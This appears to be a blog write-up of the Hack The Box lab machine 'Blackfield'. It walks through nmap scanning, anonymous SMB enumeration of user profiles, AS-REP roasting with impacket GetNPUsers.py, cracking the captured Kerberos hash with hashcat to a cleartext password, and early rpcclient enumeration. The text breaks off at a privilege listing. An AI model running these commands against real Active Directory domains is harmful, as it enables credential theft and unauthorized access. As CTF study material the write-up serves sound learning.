---
title: Hackthebox Blackfiled
toc: true
date: 2020-07-11 22:20:00 +600
excerpt: Blackfiled is a HTB active machine at present. This is completely based on enumeration which will lead our way in. This is one of the best windows machine I've enjoyed doing it.
category: hackthebox
header:
  overlay_color: '#000'
  overlay_filter: '0.75'
  overlay_image: /assets/images/sample/blackfield/blackfield.png
  teaser: /assets/images/sample/blackfield/blackfield.png
tags: [windows, activedirectory, evilwinrm, smb, rpcclient, mimikatz, lsass, impacket, hashcat ]
---


## INFO:

|Blackfield|  |
|----|---------|
|OS: 	|Windows|
|Difficulty: 	|Hard|
|Points:| 	40|
|Release:| 	06 Jun 2020|
|IP:| 	10.10.10.192|



## let's start hacking into `blackfiled`

### As always hacking starts with NMAP scan.

```ruby
root@Ac3:~# nmap -O -A -T4 blackfiled.htb                                                                                                                                                                                             
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 08:45 EDT                                                                                                                                                                            
Nmap scan report for blackfiled.htb (10.10.10.192)                                                                                                                                                                                         
Host is up (0.19s latency).                                                                                                                                                                                                                
Not shown: 993 filtered ports                                                                                                                                                                                                              
PORT     STATE SERVICE       VERSION                                                                                                                                                                                                       
53/tcp   open  domain?                                                                                                                                                                                                                     
| fingerprint-strings:                                                                                                                                                                                                                     
|   DNSVersionBindReqTCP:                                                                                                                                                                                                                  
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-11 19:49:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/11%Time=5F09B484%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h03m11s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-11T19:51:44
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   185.74 ms 10.10.14.1
2   186.22 ms blackfiled.htb (10.10.10.192)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 224.21 seconds
```






## SMB enumeration
``` ruby

Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```

## Having a look in `profiles$`

``` shell
root@Ac3:~# smbclient //10.10.10.192/profiles$
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ANavay                              D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  APustulka                           D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ARotella                            D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ASischo                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ATakach                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020
  AWorsey                             D        0  Wed Jun  3 12:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020
  BBakajza                            D        0  Wed Jun  3 12:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020
  BConsultant                         D        0  Wed Jun  3 12:47:11 2020
  BErdossy                            D        0  Wed Jun  3 12:47:11 2020
  BGeminski                           D        0  Wed Jun  3 12:47:11 2020
  BLostal                             D        0  Wed Jun  3 12:47:11 2020
  BMannise                            D        0  Wed Jun  3 12:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020
  BRigiero                            D        0  Wed Jun  3 12:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020
  BZandonella                         D        0  Wed Jun  3 12:47:11 2020
  CAcherman                           D        0  Wed Jun  3 12:47:12 2020
  CAkbari                             D        0  Wed Jun  3 12:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020
  CGronk                              D        0  Wed Jun  3 12:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020
  CHoytal                             D        0  Wed Jun  3 12:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020
  CKolbo                              D        0  Wed Jun  3 12:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020
  CSchandall                          D        0  Wed Jun  3 12:47:12 2020
  CSelters                            D        0  Wed Jun  3 12:47:12 2020
  CTolmie                             D        0  Wed Jun  3 12:47:12 2020
  DCecere                             D        0  Wed Jun  3 12:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020
  DCwilich                            D        0  Wed Jun  3 12:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020
  DKemesies                           D        0  Wed Jun  3 12:47:12 2020
  DMatuka                             D        0  Wed Jun  3 12:47:12 2020
  DMedeme                             D        0  Wed Jun  3 12:47:12 2020
  DMeherek                            D        0  Wed Jun  3 12:47:12 2020
  DMetych                             D        0  Wed Jun  3 12:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020
  DPriporov                           D        0  Wed Jun  3 12:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020
  DVellela                            D        0  Wed Jun  3 12:47:12 2020
  DVogleson                           D        0  Wed Jun  3 12:47:12 2020
  DZwinak                             D        0  Wed Jun  3 12:47:12 2020
  EBoley                              D        0  Wed Jun  3 12:47:12 2020
  EEulau                              D        0  Wed Jun  3 12:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020
  EFrixione                           D        0  Wed Jun  3 12:47:12 2020
  EJenorik                            D        0  Wed Jun  3 12:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020
  EPryar                              D        0  Wed Jun  3 12:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020
  ESariotti                           D        0  Wed Jun  3 12:47:12 2020
  ETurgano                            D        0  Wed Jun  3 12:47:12 2020
  EWojtila                            D        0  Wed Jun  3 12:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020
  FBroj                               D        0  Wed Jun  3 12:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020
  FPflum                              D        0  Wed Jun  3 12:47:12 2020
  FReffey                             D        0  Wed Jun  3 12:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020
  Gareld                              D        0  Wed Jun  3 12:47:12 2020
  GBatowski                           D        0  Wed Jun  3 12:47:12 2020
  GForshalger                         D        0  Wed Jun  3 12:47:12 2020
  GGomane                             D        0  Wed Jun  3 12:47:12 2020
  GHisek                              D        0  Wed Jun  3 12:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020
  GMerewether                         D        0  Wed Jun  3 12:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020
  GWiegard                            D        0  Wed Jun  3 12:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020
  HColantino                          D        0  Wed Jun  3 12:47:12 2020
  HConforto                           D        0  Wed Jun  3 12:47:12 2020
  HCunnally                           D        0  Wed Jun  3 12:47:12 2020
  HGougen                             D        0  Wed Jun  3 12:47:12 2020
  HKostova                            D        0  Wed Jun  3 12:47:12 2020
  IChristijr                          D        0  Wed Jun  3 12:47:12 2020
  IKoledo                             D        0  Wed Jun  3 12:47:12 2020
  IKotecky                            D        0  Wed Jun  3 12:47:12 2020
  ISantosi                            D        0  Wed Jun  3 12:47:12 2020
  JAngvall                            D        0  Wed Jun  3 12:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020
  JDanten                             D        0  Wed Jun  3 12:47:12 2020
  JDjouka                             D        0  Wed Jun  3 12:47:12 2020
  JKondziola                          D        0  Wed Jun  3 12:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020
  JLuthner                            D        0  Wed Jun  3 12:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020
  JPistachio                          D        0  Wed Jun  3 12:47:12 2020
  JScima                              D        0  Wed Jun  3 12:47:12 2020
  JSebaali                            D        0  Wed Jun  3 12:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020
  KCockeril                           D        0  Wed Jun  3 12:47:12 2020
  KColtart                            D        0  Wed Jun  3 12:47:12 2020
  KCyster                             D        0  Wed Jun  3 12:47:12 2020
  KDorney                             D        0  Wed Jun  3 12:47:12 2020
  KKoesno                             D        0  Wed Jun  3 12:47:12 2020
  KLangfur                            D        0  Wed Jun  3 12:47:12 2020
  KMahalik                            D        0  Wed Jun  3 12:47:12 2020
  KMasloch                            D        0  Wed Jun  3 12:47:12 2020
  KMibach                             D        0  Wed Jun  3 12:47:12 2020
  KParvankova                         D        0  Wed Jun  3 12:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020
  KRasmor                             D        0  Wed Jun  3 12:47:12 2020
  KShievitz                           D        0  Wed Jun  3 12:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020
  KZyballa                            D        0  Wed Jun  3 12:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020
  LBaligand                           D        0  Wed Jun  3 12:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020
  LBirer                              D        0  Wed Jun  3 12:47:12 2020
  LBobelis                            D        0  Wed Jun  3 12:47:12 2020
  LChippel                            D        0  Wed Jun  3 12:47:12 2020
  LChoffin                            D        0  Wed Jun  3 12:47:12 2020
  LCominelli                          D        0  Wed Jun  3 12:47:12 2020
  LDruge                              D        0  Wed Jun  3 12:47:12 2020
  LEzepek                             D        0  Wed Jun  3 12:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020
  LKarabag                            D        0  Wed Jun  3 12:47:12 2020
  LKirousis                           D        0  Wed Jun  3 12:47:12 2020
  LKnade                              D        0  Wed Jun  3 12:47:12 2020
  LKrioua                             D        0  Wed Jun  3 12:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020
  LMichoud                            D        0  Wed Jun  3 12:47:12 2020
  LTindall                            D        0  Wed Jun  3 12:47:12 2020
  LYturbe                             D        0  Wed Jun  3 12:47:12 2020
  MArcynski                           D        0  Wed Jun  3 12:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020
  MBrambini                           D        0  Wed Jun  3 12:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020
  MKillberg                           D        0  Wed Jun  3 12:47:12 2020
  MLapesh                             D        0  Wed Jun  3 12:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020
  MMerezio                            D        0  Wed Jun  3 12:47:12 2020
  MNaciri                             D        0  Wed Jun  3 12:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020
  MSichkar                            D        0  Wed Jun  3 12:47:12 2020
  MTemko                              D        0  Wed Jun  3 12:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020
  MTonuri                             D        0  Wed Jun  3 12:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020
  RVallandas                          D        0  Wed Jun  3 12:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020
  RWissor                             D        0  Wed Jun  3 12:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020
  SAjowi                              D        0  Wed Jun  3 12:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020
  SBouzane                            D        0  Wed Jun  3 12:47:12 2020
  SChatin                             D        0  Wed Jun  3 12:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020
  SEulert                             D        0  Wed Jun  3 12:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020
  SGolds                              D        0  Wed Jun  3 12:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020
  SHauht                              D        0  Wed Jun  3 12:47:12 2020
  SHederian                           D        0  Wed Jun  3 12:47:12 2020
  SHelregel                           D        0  Wed Jun  3 12:47:12 2020
  SKrulig                             D        0  Wed Jun  3 12:47:12 2020
  SLewrie                             D        0  Wed Jun  3 12:47:12 2020
  SMaskil                             D        0  Wed Jun  3 12:47:12 2020
  Smocker                             D        0  Wed Jun  3 12:47:12 2020
  SMoyta                              D        0  Wed Jun  3 12:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020
  SReppond                            D        0  Wed Jun  3 12:47:12 2020
  SSicliano                           D        0  Wed Jun  3 12:47:12 2020
  SSilex                              D        0  Wed Jun  3 12:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020
  STousignaut                         D        0  Wed Jun  3 12:47:12 2020
  support                             D        0  Wed Jun  3 12:47:12 2020
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020
  TKauten                             D        0  Wed Jun  3 12:47:12 2020
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020
  TOust                               D        0  Wed Jun  3 12:47:12 2020
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020
  TStausland                          D        0  Wed Jun  3 12:47:12 2020
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020
  VButziger                           D        0  Wed Jun  3 12:47:12 2020
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                7846143 blocks of size 4096. 3579546 blocks available
smb: \> 
```
## making a `username` list from the `profiles`

> Copy the usernames to a file `users.txt` and scan for `Kerberos tickets`.

## Getting Kerberos ticket

## Using impacket `GetNPUsers.py` to get the kerberos ticket.

``` python
GetNPUsers.py  blackfield.local/ -dc-ip blackfield.htb -usersfile users.txt -no-pass
```

### After running impacket script we get the kerberos ticket of `support`.

``` ruby
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$support@BLACKFIELD.LOCAL:2ce9f8bdad0f788d565face046beea93$49841d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set

```

## Time to crack the hash.

### we can user any hash cracker of our choice, here I've used `hashcat` to crack the hash.

``` python
hashcat.exe -m 18200 hash.txt D:\rockyou.txt
hashcat (v6.0.0) starting...

* Device #1: Unstable OpenCL driver detected!

This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
You can use --force to override this, but do not report related errors.

* Device #3: CUDA SDK Toolkit installation NOT detected.
             CUDA SDK Toolkit installation required for proper device support and utilization
             Falling back to OpenCL Runtime

* Device #3: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed(): Not Supported

OpenCL API (OpenCL 2.1 ) - Platform #1 [Intel(R) Corporation]
=============================================================
* Device #1: Intel(R) HD Graphics 530, skipped
* Device #2: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped

OpenCL API (OpenCL 1.2 CUDA 9.1.112) - Platform #2 [NVIDIA Corporation]
=======================================================================
* Device #3: GeForce GTX 950M, 3392/4096 MB (1024 MB allocatable), 5MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 151 MB

Dictionary cache built:
* Filename..: D:\rockyou.txt
* Passwords.: 14344394
* Bytes.....: 139921528
* Keyspace..: 14344387
* Runtime...: 2 secs

Cracking performance lower than expected?

* Append -O to the commandline.
  This lowers the maximum supported password- and salt-length (typically down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5asrep$23$support@BLACKFIELD.LOCAL:2ce9f8bdad0f788d565face046beea93$49841d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d:#00^BlackKnight

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:2ce9f8bdad0f...6ab74d
Time.Started.....: Sat Jul 11 18:57:49 2020 (7 secs)
Time.Estimated...: Sat Jul 11 18:57:56 2020 (0 secs)
Guess.Base.......: File (D:\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#3.........:  2173.1 kH/s (7.12ms) @ Accel:128 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 14336000/14344387 (99.94%)
Rejected.........: 0/14336000 (0.00%)
Restore.Point....: 14295040/14344387 (99.66%)
Restore.Sub.#3...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#3....: *toille*1410* -> #!kayla
Hardware.Mon.#3..: Temp: 54c Util: 47% Core: 928MHz Mem:2505MHz Bus:16

Started: Sat Jul 11 18:57:33 2020
Stopped: Sat Jul 11 18:57:57 2020
```
``` ruby

$krb5asrep$23$support@BLACKFIELD.LOCAL:2ce9f8bdad0f788d565face046beea93$49841d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d:#00^BlackKnight

```
So the password of `support` is `#00^BlackKnight`

###  As I got the password of `support` I tried to login in via `evil-winrm` but no luck. Then I decided to use `rpcclient` to enumerate further.

```
rpcclient blackfield.htb -U support 
Enter WORKGROUP\support's password: 
rpcclient $> 
```
``` ruby
rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
